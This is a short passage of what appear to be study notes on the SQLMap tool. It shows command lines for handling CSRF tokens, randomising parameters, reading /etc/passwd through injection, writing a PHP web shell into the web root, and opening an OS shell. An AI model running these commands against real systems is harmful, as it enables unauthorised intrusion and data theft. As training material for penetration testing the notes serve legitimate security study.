...
There are several ways that ***[SQLMap](https://github.com/sqlmapproject/sqlmap)*** supports in order to properly set up the given *HTTP Requests* before its usage

##### *Curl Commands*

> ***Browser → Dev Tools → Network Tab → Right Click to the select HTTP Request → Copy → Copy as cURL (POSIX)***

![[SQLMAP-20260210204151808.webp|400]]
...
![[SQLMAP-20260210210526544.webp|350]]
...
>
> ```bash
> sqlmap --url 'http[s]://www.example.com?id=1' --random-agent --batch --csrf-token="anti_csrf_token"
> ```
>
...
>
> ```bash
> sqlmap --url 'http[s]://www.example.com' --method POST --data 'id=1&name=test' --batch --random-agent --randomize="test"
> ```
>
...
>
> ```bash
> sqlmap --url 'http[s]://www.example.com' --method POST --data 'id=3&h=c4ca4238a0b923820dcc509a6f75849b' --batch --random-agent --eval="import hashlib;h=hashlib.md5(id).hexdigest()"
> ```
>
...
>
> ```bash
> sqlmap --url 'https://www.example.com?id=1*' --batch --random-agent --file-read '/etc/passwd'
> ```
>
...
>
> ```bash
> sqlmap --url 'https://www.example.com' --method POST --data 'id=1*' --batch --random-agent --file-write 'shell.php' --file-dest '/var/www/html/shell.php'
> ```
>
...
>
> ```bash
> sqlmap --url 'https://www.example.com?id=1*' --batch --random-agent --os-shell --technique=E # Error-based SQLi
> ```
>